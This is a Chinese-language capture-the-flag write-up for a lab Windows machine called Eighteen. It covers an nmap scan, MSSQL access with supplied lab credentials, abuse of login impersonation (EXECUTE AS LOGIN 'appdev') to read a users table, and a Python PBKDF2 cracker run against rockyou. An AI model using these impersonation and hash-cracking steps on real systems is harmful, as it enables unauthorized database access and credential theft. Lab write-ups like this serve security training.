# 侦察
## 凭证

机器信息:

	像现实生活中常见的 Windows 渗透测试一样，你将使用以下账户凭证启动 Eighteen 盒子：kevin/iNa2we6haRj2gaw!
#### 端口扫描

```
$ nmap -sC -sV -vv -oA 10.129.156.245

Nmap scan report for 10.129.156.245
Host is up, received echo-reply ttl 127 (0.32s latency).
Scanned at 2025-11-15 14:03:28 EST for 57s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-11-16T02:04:29+00:00; +7h00m04s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-13T19:00:26
| Not valid after:  2055-11-13T19:00:26
| MD5:   44e1:e666:3f88:1148:9aa1:d47d:59d9:c214
| SHA-1: 979a:ab38:dc01:51b4:4291:6200:eef1:f5a4:f4db:5f1f
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQbVFyufWkmY9KQvQXa0xRkDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMTEzMTkwMDI2WhgPMjA1NTExMTMxOTAwMjZaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALgj6Fxb
| Zd8kZ+XtcQJNX1IQQ/bOFnOMu9hXOuqUGYVDQ79sf8Rk0lc5aZrE+3OrjixbEjvE
| tw3DbkcT/hYc1QSQaCop/G4/SmpNoaagHfRRZIQ+ZhoBt6dSd9+hY9/ldcyDNk7J
| Tk+8h2dB5oXRc6U61BxUffwbeYsEJZubsEv8TtBLdz9pbXF0UlU4uPQxMPYXdKuC
| xIS1X1AVMXoPcc8ewT+qpU4GSsYlFsbOSrFYBgXgDZOXzBi2jrHxcR8tyafm4uIN
| LzRHU46D2rxZrmDPi+QpfIYzROnhCZG3s8ORBwGUKR8mhdDzIGWq8o1qh5dwMjtY
| ggLfXfUQg6YaMj3Glb8FRo8Uc+TSg6XYh2v6rQh0L2kHFj8UZqYWYNMFn6cJrQ84
| iugDE/u/bxZXgudF/xA1uiAxbPG7Jx+JkJjB17zTleUPDWnVTncw0/jwC7e01Ugp
| HeBytzARWPAXOmSgru+vhDtr9PT1zVQ0f/LfQJsTFj4t9iJtxVHav/48FQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQAo1c9vzHy6ktF+EOvti9DBV/1TXJgX/748rMfe
| n2E7SQX+YSPdszguAMWgLPu5H/8uBQQhB2Zv2gsOS98IYMu8DaowcHQABIUBCWKj
| 4zsgzzsiBesYvqBMPOKahmMLdmxQd8zfKH9sfcsrMWahaLgFWarrd3EHLCNyNfZU
| bNfQT2sDVFlw7k/XqTcbs61GtyQjwIkYrSskt86iqh0Khrs14n9HzxEGfz5zNaSE
| P61z1apAD5dFkNZWL8RySBBP93Xk5WRAxVREkd1cjDNt007c/y0tUonfrghWufGt
| Xdu4aYbdRHPmI6PInXbXg6Ed+MeHSz/P1ilpvder/uZ7tB/aoKGMF05Cm63tU4tw
| GCmrEsLEtGNtFhPT25hCbh3wNbfWppj2qGgDO4h1SMrMVwlazVmvGGjIcVCm+ZSb
| jELRKLD+hRqYXjPbU6G8C+rH1JuGPrIn1OpQsxYCRNlTkVSm0hQ9CxPO4yRvO/tY
| 3paLzBAaqFXy7FHTgrr9L60vfIY=
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m03s
```
- **域名**: `eighteen.htb`
## 初始访问

### MSSQL 枚举
#### SQL 身份验证（访客访问）
```BASH
impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
```
**结果**：以 `guest` 身份连接，权限有限。
#### 枚举登录

```SQL
-- 检查当前用户
SELECT SYSTEM_USER, USER_NAME();

-- 列出数据库
SELECT name FROM master.dbo.sysdatabases;
```
#### 发现模拟权限

```SQL
enum_impersonate
```

**关键发现**：Kevin 可以假冒 `appdev` 登录!
#### 模拟 appdev 并访问数据库

```SQL
-- 冒充 appdev
EXECUTE AS LOGIN = 'appdev';

-- 核实
SELECT SYSTEM_USER, USER_NAME();

-- 访问 financial_planner 数据库
USE financial_planner;

-- 列出表格
SELECT name FROM sys.tables;
```
### 提取用户凭证

```SQL
SELECT * FROM users;
```
### 破解密码哈希

创建了一个 Python 脚本来破解 Flask PBKDF2 哈希：

```PYTHON
#!/usr/bin/env python3
import hashlib
import gzip
from multiprocessing import Pool, cpu_count

def check_password(args):
    password, salt, iterations, target_hash = args
    try:
        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
        if computed.hex() == target_hash:
            return password.decode('utf-8', errors='ignore')
    except:
        pass
    return None

# Hash components
salt = "<REDACTED_SALT>"
iterations = 600000
target_hash = "<REDACTED_HASH>"

# Run against rockyou.txt with multiprocessing
```

**破解密码**：iloveyou1
